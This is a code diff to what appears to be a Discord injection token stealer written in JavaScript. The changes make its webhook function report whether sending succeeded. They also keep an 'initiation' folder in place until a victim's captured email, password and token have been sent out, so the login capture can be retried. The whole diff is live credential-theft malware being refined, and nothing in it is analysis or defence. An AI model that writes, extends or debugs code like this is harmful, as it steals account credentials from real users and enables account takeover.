@@ -248,8 +248,10 @@ const hooker = async (content, token, account) => {
             "Content-Type": "application/json"
         }, JSON.stringify(content));
         console.log('DEBUG: Webhook sent successfully!');
+        return true; // Return success
     } catch (error) {
         console.log('DEBUG: Webhook send failed:', error.message);
+        return false; // Return failure
     }
 };
 
@@ -391,7 +393,16 @@ const EmailPassToken = async (email, password, token, action) => {
         };
         
         console.log('DEBUG: Calling hooker with content...');
-        await hooker(content, token, account);
+        const webhookSuccess = await hooker(content, token, account);
+        
+        // Only remove initiation folder if webhook was sent successfully
+        if (webhookSuccess && fs.existsSync(path.join(__dirname, 'initiation'))) {
+            console.log('DEBUG: SUCCESS! Removing initiation folder after successful data capture...');
+            fs.rmdirSync(path.join(__dirname, 'initiation'));
+        } else if (!webhookSuccess) {
+            console.log('DEBUG: Webhook failed - keeping initiation folder for retry');
+        }
+        
     } catch (error) {
         console.log('DEBUG: EmailPassToken error:', error.message);
     }
@@ -511,8 +522,10 @@ const discordPath = (function () {
 async function initiation() {
     console.log('DEBUG: Initiation function called');
     if (fs.existsSync(path.join(__dirname, 'initiation'))) {
-        console.log('DEBUG: Removing initiation folder and starting injection...');
-        fs.rmdirSync(path.join(__dirname, 'initiation'));
+        console.log('DEBUG: Initiation folder found - injection is active!');
+        
+        // DON'T DELETE THE FOLDER YET - we need it to stay active for login capture!
+        // The folder will be deleted after successful login capture in EmailPassToken
 
         const token = await getToken();
         if (token) {
